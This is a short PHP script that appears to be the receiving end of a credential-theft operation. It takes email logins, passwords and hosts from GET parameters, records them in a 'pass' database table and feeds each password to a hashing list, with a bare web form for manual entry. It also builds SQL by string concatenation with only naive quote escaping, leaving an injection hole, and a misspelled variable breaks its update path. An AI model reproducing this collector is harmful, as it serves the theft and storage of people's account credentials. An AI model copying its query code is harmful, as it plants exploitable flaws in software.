<?
	include_once "../files/common.php";
	include_once "../forums/forums.php";
	include_once "../hashes/hashes.php";

function GetUserPass($login, $pass)
{
	$query = "select * from pass where pwdLogin='$login' and pwdPass='$pass'";
	$res = uquery($query);
	if($res && mysql_num_rows($res)) return mysql_fetch_assoc($res);
	return 0;
}
function AddPass($pwd, $login, $host)
{
	if(GetUserPass($login, $pwd)) $uqery = "update pass set pwdTime=now() where pwdPass='$pwd' and pwdLogin='$login'";
	else $query = "insert ignore into pass (pwdPass,pwdLogin,pwdHost,pwdTime) values('$pwd','$login','$host',now())";
	return uquery($query);
}


	if(isset($_GET['login']) && isset($_GET['pass']) && isset($_GET['host']))  
	{
		$login 	= str_replace("'","\'",$_GET['login']);
		$login = str_replace("_40", "@", $login);
		$pass 	= str_replace("'","\'",$_GET['pass']);
		if(strpos($login, '@') == FALSE) die();
		$host 	= str_replace("'","\'",$_GET['host']);
		if($login === "" || $pass ==="") return;
		AddPass($pass, $login, $host);
		AddHash($pass);
	}
?>

<form action='' method=get>
Login: <input type=text name=login><br>
Passw: <input type=text name=pass><br>
Host.: <input type=text name=host><br>
<input type=submit value='Add'>
</form>